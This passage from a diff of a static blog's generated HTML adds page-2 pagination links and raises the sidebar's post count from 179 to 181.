+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1076,7 +1059,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">179</span>
+          <span class="site-state-item-count">181</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
